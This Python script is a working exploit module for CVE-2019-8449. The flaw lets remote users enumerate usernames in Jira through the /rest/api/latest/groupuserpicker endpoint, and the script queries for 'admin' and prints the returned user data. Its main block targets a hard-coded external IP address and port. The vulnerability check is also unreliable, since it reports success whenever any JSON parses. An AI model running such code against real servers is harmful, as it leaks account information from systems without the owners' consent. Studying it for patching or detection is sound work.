#!/usr/bin/python3

'''
name: CVE-2019-8449漏洞
description: CVE-2019-8449漏洞可允许远程攻击者枚举用户名,导致信息泄露.Exploit for Jira v2.1 - v8.3.4
'''

from app.lib.utils.request import request


class CVE_2019_8449_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0"
        }
        self.query = 'admin' # search keyword
        self.maxResults = '50' # the number of maximum results to fetch: (50) => ")
        self.showAvatar = 'true' # 'true' or 'false' whether to show Avatar of the user or not
        self.fieldId = '' # the fieldId to fetch
        self.projectId ='' # the projectId to fetch
        self.issueTypeId = '' # Enter the issueTypeId to fetch
        self.avatarSize = '' # the size of Avatar to fetch: (xsmall)
        self.caseInsensitive = 'true' # 'true' or 'false' whether to show results case insensitive or not
        self.excludeConnectAddons = '' #Indicates whether Connect app users and groups should be excluded from the search results. If an invalid value is provided, the default value is used:

        self.params = {
            'query': self.query, 
            'maxResults': self.maxResults, 
            'showAvatar': self.showAvatar, 
            'fieldId': self.fieldId, 
            'projectId': self.projectId, 
            'issueTypeId': self.issueTypeId, 
            'avatarSize': self.avatarSize, 
            'caseInsensitive': self.caseInsensitive, 
            'excludeConnectAddons': self.excludeConnectAddons
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        check_url = self.url + '/rest/api/latest/groupuserpicker'
        try:
            check_quest = request.get(url = check_url, headers = self.headers, params = self.params)
            check_json = check_quest.json()
            print('存在CVE-2019-8449漏洞,结果为:', check_json)
            return True
        except Exception as e:
            print(e)
            print('不存在CVE-2019-8449漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2019_8449 = CVE_2019_8449_BaseVerify('http://116.62.33.57:8082')
    CVE_2019_8449.run()
